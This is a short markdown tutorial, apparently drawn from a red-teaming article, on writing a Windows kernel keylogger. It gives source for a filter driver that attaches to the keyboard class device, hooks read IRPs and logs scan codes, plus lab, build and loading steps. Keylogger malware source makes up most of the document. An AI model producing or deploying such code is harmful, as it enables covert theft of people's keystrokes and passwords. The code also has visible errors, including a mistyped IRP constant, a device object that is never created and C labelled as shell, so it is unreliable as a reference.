# KeyLogging in the kernel
This keylogger will sit between the keyboard class driver and the user-mode application, capturing `IRP_WJ_READ` packets.
```sh
[Keyboard Device] -> [Keyboard Class Driver] -> [kbdclass.sys] - [User Mode]
```

## Lab Setup
- Windows 11 VM
- Visual Studio 2022
- Windows Driver Kit (WDK)
- `bcdedit / set testsigning on`
- Kernel Debugger (WinDbg)
- VM Snapshot

## Step 1: Define DriverEntry and DeviceAttach
```sh
NTStatus DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
    UNREFERENCED_PARAMETER(RegistryPath);

    DriverObject->DriverUnload = UnloadDriver;
    DriverObject->MajorFunction[IRP_MJ_READ] = ReadDispatch;

    UNICODE_STRING deviceName = RTL_CONSTANT_STRING(L"\\Device\\KeyboardClass0");
    PDEVICE_OBJECT keyboardDevice = NULL;

    NTSTATUS status = IoAttachDevice(DriverObject->DeviceObject, &deviceName, &keyboardDevice);

    if (!NT_SUCCESS(status)) {
        DbgPrint("Failed to attach device %x\n", status);
        return status;
    }

    DbgPrint("Successfully attached device \n");
    return STATUS_SUCCESS;
}
```


## Step 2. Handle Read IRPs
```sh
NTSTATUS ReadDispatch(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    PIO_STACK_LOCATION ioStack = IoGetCurrentIrpStackLocation(Irp);
    
    // Set a completion routine
    IoCopyCurrentIrpStackLocationToNext(Irp);
    IoSetCompletionRoutine(Irp, ReadCompletionRoutine, NULL, TRUE, TRUE, TRUE);

    return IoCallDriver(((PDEVICE_EXTENSION)DeviceObject->DeviceExtension)->LowerDevice, Irp);
}
```

## Step 3 - Extract keystrokes in Completion Routine
```sh
NTSTATUS ReadCompletionRoutine(PDEVICE_OBJECT DeviceObject, PIRP Irp, PVOID Context)
{
    if (Irp->IoStatus.Status == STATUS_SUCCESS) {
        PKEYBOARD_INPUT_DATA keys = (PKEYBOARD_INPUT_DATA)Irp->AssociatedIrp.SystemBuffer;
        ULONG count = Irp->IoStatus.Information / sizeof(KEYBOARD_INPUT_DATA);

        for (ULONG i = 0; i < count; i++) {
            USHORT scanCode = keys[i].MakeCode;
            BOOLEAN keyDown = !(keys[i].Flags & KEY_BREAK);

            if (keyDown) {
                DbgPrint("Key Pressed: ScanCode: %x\n", scanCode);
            }
        }
    }

    return Irp->IoStatus.Status;
}
```

## Step 4 - Build Driver
- Create new KMDF or WDM driver project in VS
- Link against (`ntoskrnl.lib`, `wdm.lib`)
- Set correct target OS, platform and driver settings.
- Build in x64 debug mode

## Testing
- Load driver with `OSRLoader` or `sc create`
- Monitor debug output 
- Press keys

### Sources
[Medium]("https://medium.com/@yesspider1101/building-a-kernel-keylogger-red-teaming-in-the-shadows-3b972b941b43")

